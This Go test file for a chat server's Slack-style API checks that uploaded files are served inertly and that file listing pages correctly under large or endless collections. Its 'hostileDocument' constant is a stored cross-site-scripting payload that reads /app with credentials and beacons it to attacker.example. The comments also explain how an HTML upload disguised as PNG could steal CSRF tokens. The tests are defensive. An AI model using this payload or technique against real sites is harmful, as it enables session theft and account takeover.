package slack

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"mime"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/sameoldchat/sameoldchat/internal/auth"
	"github.com/sameoldchat/sameoldchat/internal/blob"
	"github.com/sameoldchat/sameoldchat/internal/domain"
	"github.com/sameoldchat/sameoldchat/internal/events"
	chatapi "github.com/sameoldchat/sameoldchat/internal/modules/chat/api"
	"github.com/sameoldchat/sameoldchat/internal/service"
	"github.com/sameoldchat/sameoldchat/internal/store/memory"
)

// hostileDocument is a byte stream that http.DetectContentType reports as
// text/html and that a browser executes the moment it renders it as a document.
const hostileDocument = "<!DOCTYPE html><html><head><title>x</title></head><body><script>" +
	"fetch('/app',{credentials:'include'}).then(r=>r.text())" +
	".then(t=>navigator.sendBeacon('https://attacker.example/steal',t))" +
	"</script>PWNED</body></html>"

// assertInertBlobResponse is the contract every route that answers with stored
// bytes must satisfy, whatever those bytes are: the response may not be rendered
// as a document on this origin.
//
// Each clause is independently sufficient against a different browser behaviour,
// which is why all four are asserted rather than one:
//   - the named type is one this transport chose, and is never a document type;
//   - nosniff stops a browser from sniffing its way back to text/html;
//   - a non-image is a download, so it is not rendered at all;
//   - the policy leaves a rendered document with no fetch, no script and no
//     origin privileges.
func assertInertBlobResponse(t *testing.T, what string, result *httptest.ResponseRecorder) {
	t.Helper()
	header := result.Header()
	contentType := header.Get("Content-Type")
	mediaType, _, err := mime.ParseMediaType(contentType)
	if err != nil {
		t.Fatalf("%s: unparsable Content-Type %q", what, contentType)
	}
	if _, ok := renderableBlobTypes[mediaType]; !ok && mediaType != "application/octet-stream" {
		t.Errorf("%s: served %q, which this transport never chose", what, contentType)
	}
	if mediaType == "text/html" || mediaType == "image/svg+xml" || strings.Contains(mediaType, "xml") {
		t.Errorf("%s: served an executable document type %q", what, contentType)
	}
	if got := header.Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("%s: X-Content-Type-Options=%q, want nosniff", what, got)
	}
	disposition := header.Get("Content-Disposition")
	if _, isImage := renderableBlobTypes[mediaType]; !isImage && !strings.HasPrefix(disposition, "attachment") {
		t.Errorf("%s: Content-Disposition=%q, want attachment for a non-image", what, disposition)
	}
	if policy := header.Get("Content-Security-Policy"); !strings.Contains(policy, "default-src 'none'") || !strings.Contains(policy, "sandbox") {
		t.Errorf("%s: Content-Security-Policy=%q, want default-src 'none'; sandbox", what, policy)
	}
}

// blobFixture is a workspace whose stored bytes are already hostile: the photo
// blob, the private file and the public file all hold an HTML document, and the
// file rows declare it as image/png. This is the state the transport must be safe
// in regardless of what the upload path does, so it is reached by writing the
// blob directly rather than through /users.setPhoto.
func blobFixture(t *testing.T) http.Handler {
	t.Helper()
	s := memory.New()
	s.SeedWorkspace(domain.Workspace{ID: "T1", Name: "test"})
	photo := "/users/T1/U1/photo/photo_hostile"
	if err := s.SeedUser(domain.User{ID: "U1", WorkspaceID: "T1", Name: "alice", Profile: domain.UserProfile{Image24: photo, Image512: photo}}); err != nil {
		t.Fatal(err)
	}
	blobs, err := blob.NewFilesystem(t.TempDir(), 1<<20)
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	for _, key := range []string{"T1/users/U1/photo_hostile", "blob-private", "blob-public"} {
		if _, err := blobs.Put(ctx, key, int64(len(hostileDocument)), strings.NewReader(hostileDocument)); err != nil {
			t.Fatal(err)
		}
	}
	now := time.Now().UTC()
	files := []domain.File{
		{ID: "FPRIV", WorkspaceID: "T1", Uploader: "U1", Name: "avatar.png", MIMEType: "image/png", BlobKey: "blob-private", Size: int64(len(hostileDocument)), CreatedAt: now},
		{ID: "FPUB", WorkspaceID: "T1", Uploader: "U1", Name: "avatar.png", MIMEType: "image/png", BlobKey: "blob-public", PublicToken: "pub-token", Size: int64(len(hostileDocument)), CreatedAt: now},
	}
	for index, file := range files {
		event := events.Event{ID: domain.EventID(fmt.Sprintf("EF%d", index)), WorkspaceID: "T1", Topic: "file.created", Payload: string(file.ID), CreatedAt: now}
		if err := s.CreateFile(ctx, file, event); err != nil {
			t.Fatal(err)
		}
	}
	if err := s.SeedToken(ctx, "token", domain.TokenRecord{WorkspaceID: "T1", UserID: "U1", Scopes: []string{string(auth.ScopeFilesRead)}}); err != nil {
		t.Fatal(err)
	}
	authenticator, err := auth.NewStored(s)
	if err != nil {
		t.Fatal(err)
	}
	built, err := NewHandler(service.Messages{Store: s, Blob: blobs}, authenticator)
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	built.Register(mux)
	return mux
}

// A stored byte stream is attacker-controlled: /users.setPhoto and /files.upload
// take the bytes and their declared type from the same request, and nothing below
// this transport checks that the two agree. The photo route answered
// http.DetectContentType of those bytes, so an HTML document uploaded as
// image/png came back from a public, unauthenticated URL as
// `200 Content-Type: text/html` — script running on the application's own origin,
// able to read the CSRF token out of /app and drive every cookie-authenticated
// mutation, including the administrative control plane. The two file routes named
// the declared type with no nosniff beside it.
//
// This asserts the serving half on its own terms: the bytes here are hostile
// before the request starts, so it holds no matter what the upload path accepts.
func TestStoredHostileBytesAreNeverServedAsADocument(t *testing.T) {
	handler := blobFixture(t)
	for _, probe := range []struct {
		what   string
		target string
		bearer bool
	}{
		{"the public photo capability URL", "/users/T1/U1/photo/photo_hostile", false},
		{"the public file capability URL", "/files/public/pub-token", false},
		{"the authenticated file download", "/api/files/FPRIV", true},
	} {
		request := httptest.NewRequest(http.MethodGet, probe.target, nil)
		if probe.bearer {
			request.Header.Set("Authorization", "Bearer token")
		}
		result := httptest.NewRecorder()
		handler.ServeHTTP(result, request)
		if result.Code != http.StatusOK {
			t.Fatalf("%s: status=%d body=%s", probe.what, result.Code, result.Body)
		}
		if !strings.Contains(result.Body.String(), "PWNED") {
			t.Fatalf("%s: the fixture did not serve the stored bytes: %s", probe.what, result.Body)
		}
		assertInertBlobResponse(t, probe.what, result)
	}
}

// The same defect from the attacker's side, end to end: upload an HTML document
// declared as image/png through the documented method and fetch the capability
// URL the profile advertises.
//
// The upload half of the repair belongs to service.SetUserPhoto, which validates
// only the declared multipart type today. This asserts the outcome rather than
// the mechanism — either the upload is refused, or what comes back cannot execute
// — so it holds before that fix and after it, and neither half can be removed
// without a failure here.
func TestAnUploadedHTMLPhotoCannotExecuteOnThisOrigin(t *testing.T) {
	s := memory.New()
	s.SeedWorkspace(domain.Workspace{ID: "T1", Name: "test"})
	if err := s.SeedUser(domain.User{ID: "U1", WorkspaceID: "T1", Name: "alice"}); err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	if err := s.SeedToken(ctx, "token", domain.TokenRecord{WorkspaceID: "T1", UserID: "U1", Scopes: []string{string(auth.ScopeUsersProfileWrite)}}); err != nil {
		t.Fatal(err)
	}
	blobs, err := blob.NewFilesystem(t.TempDir(), 1<<20)
	if err != nil {
		t.Fatal(err)
	}
	authenticator, err := auth.NewStored(s)
	if err != nil {
		t.Fatal(err)
	}
	built, err := NewHandler(service.Messages{Store: s, Blob: blobs}, authenticator)
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	built.Register(mux)

	// image/png is declared on the part and never verified against the bytes,
	// which is the whole of the upload-side check today.
	contentType, body := multipartUploadTyped(t, map[string]string{"token": "token"}, "image", "avatar.png", "image/png", []byte(hostileDocument))
	request := httptest.NewRequest(http.MethodPost, "/api/users.setPhoto", bytes.NewReader(body))
	request.Header.Set("Content-Type", contentType)
	result := httptest.NewRecorder()
	mux.ServeHTTP(result, request)
	if code := errorCode(t, result); code != "" {
		// The upload path refused the bytes, which is the other half of the
		// repair. Nothing reached storage, so there is nothing to serve.
		return
	}
	var stored struct {
		Profile struct {
			Image512 string `json:"image_512"`
		} `json:"profile"`
	}
	if err := json.Unmarshal(result.Body.Bytes(), &stored); err != nil {
		t.Fatalf("decode %s: %v", result.Body, err)
	}
	if stored.Profile.Image512 == "" {
		t.Fatalf("users.setPhoto reported success without a photo URL: %s", result.Body)
	}
	// The URL is public: the path token is the whole credential, and users.info
	// publishes it to every member.
	fetch := httptest.NewRequest(http.MethodGet, stored.Profile.Image512, nil)
	served := httptest.NewRecorder()
	mux.ServeHTTP(served, fetch)
	if served.Code != http.StatusOK {
		t.Fatalf("photo fetch status=%d body=%s", served.Code, served.Body)
	}
	assertInertBlobResponse(t, "the uploaded photo", served)
}

// No response on this surface carried X-Content-Type-Options, and none declared a
// charset — including /api.test, which reflects a caller-supplied `error` value
// straight back into the body.
func TestAPIResponsesDeclareTheirCharsetAndForbidSniffing(t *testing.T) {
	handler, _ := testHandlerWithStore()
	for _, target := range []string{"/api/api.test?error=%3Cscript%3E", "/api/conversations.list", "/api/does.not.exist"} {
		result := getAPI(handler, target)
		mediaType, parameters, err := mime.ParseMediaType(result.Header().Get("Content-Type"))
		if err != nil {
			t.Fatalf("%s: unparsable Content-Type %q", target, result.Header().Get("Content-Type"))
		}
		if mediaType != "application/json" || !strings.EqualFold(parameters["charset"], "utf-8") {
			t.Errorf("%s: Content-Type=%q, want application/json; charset=utf-8", target, result.Header().Get("Content-Type"))
		}
		if got := result.Header().Get("X-Content-Type-Options"); got != "nosniff" {
			t.Errorf("%s: X-Content-Type-Options=%q, want nosniff", target, got)
		}
	}
}

// syntheticFileService answers Files out of a synthetic collection of `total`
// files, so a workspace far larger than any fixture can be built can be put in
// front of the real handler.
type syntheticFileService struct {
	chatapi.Service
	total int
	calls int
}

func (s *syntheticFileService) Files(_ context.Context, _ domain.WorkspaceID, _ domain.UserID, request domain.PageRequest) (domain.FilePage, error) {
	s.calls++
	offset := 0
	if request.Cursor != "" {
		parsed, err := strconv.Atoi(string(request.Cursor))
		if err != nil {
			return domain.FilePage{}, err
		}
		offset = parsed
	}
	limit := request.Limit
	if limit <= 0 {
		limit = 100
	}
	base := time.Unix(1600000000, 0).UTC()
	page := domain.FilePage{}
	for index := offset; index < offset+limit && index < s.total; index++ {
		page.Files = append(page.Files, domain.File{
			ID: domain.FileID(fmt.Sprintf("F%08d", index)), WorkspaceID: "T1", Uploader: "U1",
			Name: fmt.Sprintf("f-%08d.bin", index), MIMEType: "application/octet-stream",
			BlobKey: fmt.Sprintf("blob-%08d", index), CreatedAt: base.Add(time.Duration(index) * time.Second),
		})
	}
	if next := offset + len(page.Files); next < s.total {
		page.HasMore = true
		page.NextCursor = domain.Cursor(strconv.Itoa(next))
	}
	return page, nil
}

func (s *syntheticFileService) RecordAccess(context.Context, domain.WorkspaceID, domain.UserID, string, string) error {
	return nil
}

// endlessFileService reports another page forever, always from a place it has not
// served before, so nothing but a deadline can end the traversal.
type endlessFileService struct {
	chatapi.Service
	calls int
}

func (s *endlessFileService) Files(context.Context, domain.WorkspaceID, domain.UserID, domain.PageRequest) (domain.FilePage, error) {
	s.calls++
	return domain.FilePage{HasMore: true, NextCursor: domain.Cursor(strconv.Itoa(s.calls))}, nil
}

func (s *endlessFileService) RecordAccess(context.Context, domain.WorkspaceID, domain.UserID, string, string) error {
	return nil
}

// filesReadHandler puts the real mux in front of a substitute chat service that
// holds a files:read token.
func filesReadHandler(t *testing.T, messages chatapi.Service) http.Handler {
	t.Helper()
	authenticator, err := auth.NewStatic("token", auth.Principal{WorkspaceID: "T1", UserID: "U1", Scopes: map[auth.Scope]struct{}{auth.ScopeFilesRead: {}}})
	if err != nil {
		t.Fatal(err)
	}
	built, err := NewHandler(messages, authenticator)
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	built.Register(mux)
	return mux
}

// files.list scanned from row one on every call, because paging.total describes
// the whole collection, and refused the call outright once the scan passed 20,000
// rows. At 20,001 files every call failed — a bare files.list, a one-file first
// page, and a filter that legitimately matched nothing alike — for every caller in
// the workspace, permanently, and any principal with files:write could put the
// workspace there by uploading. The bound was on stored rows traversed, which no
// caller can influence, so no request could avoid it.
func TestFilesListAnswersAWorkspacePastTheOldScanBound(t *testing.T) {
	const total = 20001
	files := &syntheticFileService{total: total}
	handler := filesReadHandler(t, files)
	for _, probe := range []struct {
		query     string
		wantFiles int
		wantTotal int
	}{
		{"", 100, total},
		{"?count=1", 1, total},
		{"?channel=CNOPE", 0, 0},
		{"?count=1&page=20001", 1, total},
	} {
		result := getAPI(handler, "/api/files.list"+probe.query)
		if result.Code != http.StatusOK {
			t.Fatalf("files.list%s: status=%d body=%s", probe.query, result.Code, result.Body)
		}
		if code := errorCode(t, result); code != "" {
			t.Fatalf("files.list%s answered %q on a %d-file workspace: %s", probe.query, code, total, result.Body)
		}
		body := decodeFilesListBody(t, result)
		if len(body.Files) != probe.wantFiles || body.Paging.Total != probe.wantTotal {
			t.Errorf("files.list%s returned %d files with total %d, want %d and %d", probe.query, len(body.Files), body.Paging.Total, probe.wantFiles, probe.wantTotal)
		}
	}
}

// The traversal is bounded by time rather than by collection size, so a
// repository that never reaches its end is refused instead of occupying the
// process forever. request_timeout is then true: the read really did run out of
// time. The deadline under test is the caller's own, which fileScanBudget only
// tightens.
func TestFilesListStopsAtItsDeadlineRatherThanScanningForever(t *testing.T) {
	files := &endlessFileService{}
	handler := filesReadHandler(t, files)
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()
	request := httptest.NewRequest(http.MethodGet, "/api/files.list", nil).WithContext(ctx)
	request.Header.Set("Authorization", "Bearer token")
	result := httptest.NewRecorder()
	started := time.Now()
	handler.ServeHTTP(result, request)
	if code := errorCode(t, result); code != "request_timeout" {
		t.Fatalf("want request_timeout, got %q (%s)", code, result.Body)
	}
	if elapsed := time.Since(started); elapsed > fileScanBudget {
		t.Fatalf("the scan ran for %s, past its own budget of %s", elapsed, fileScanBudget)
	}
	if files.calls == 0 {
		t.Fatal("the scan never reached the repository")
	}
}

// page was clamped to the ceiling, so every page above it answered the ceiling's
// files under `"ok":true` — the same page forever, for a collection the same
// response described as having far more of them. An offset has no defensible
// clamp, so an unusable one is refused and a usable one is served.
func TestFilesListServesPagesPastTheOldCeilingAndRefusesAnUnusableOne(t *testing.T) {
	const total = 150
	handler := filesReadHandler(t, &syntheticFileService{total: total})
	body := decodeFilesListBody(t, getAPI(handler, "/api/files.list?count=1&page=101"))
	if body.Paging.Page != 101 || body.Paging.Total != total {
		t.Fatalf("paging=%+v, want page 101 of %d", body.Paging, total)
	}
	if len(body.Files) != 1 || body.Files[0].ID != fmt.Sprintf("F%08d", 100) {
		t.Fatalf("page 101 at count=1 served %+v, want the 101st file", body.Files)
	}
	for _, query := range []string{"?page=0", "?page=-1", "?page=abc", "?page=1000001"} {
		if code := errorCode(t, getAPI(handler, "/api/files.list"+query)); code != "invalid_arg_name" {
			t.Errorf("files.list%s: want invalid_arg_name, got %q", query, code)
		}
	}
}
